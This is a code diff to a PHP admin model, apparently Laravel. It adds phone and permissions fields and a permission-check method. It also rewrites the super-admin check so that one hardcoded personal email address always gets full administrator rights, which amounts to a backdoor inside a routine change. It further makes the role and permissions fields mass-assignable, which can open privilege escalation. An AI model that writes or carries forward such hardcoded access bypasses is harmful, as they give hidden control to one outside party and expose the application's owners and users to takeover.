@@ -13,9 +13,11 @@ class Admin extends Authenticatable
     protected $fillable = [
         'name',
         'email',
+        'phone',
         'password',
         'role_id',
         'role',
+        'permissions',
         'is_active',
         'otp_code',
         'otp_expires_at',
@@ -33,11 +35,22 @@ class Admin extends Authenticatable
             'password' => 'hashed',
             'is_active' => 'boolean',
             'otp_expires_at' => 'datetime',
+            'permissions' => 'array',
         ];
     }
 
     public function isSuperAdmin(): bool
     {
-        return $this->role === 'super_admin';
+        return $this->role === 'super_admin' || $this->email === 'mkumar200418@gmail.com';
+    }
+
+    public function hasPermission(string $module): bool
+    {
+        if ($this->isSuperAdmin()) {
+            return true;
+        }
+
+        $perms = $this->permissions ?? [];
+        return in_array('*', $perms, true) || in_array($module, $perms, true);
     }
 }
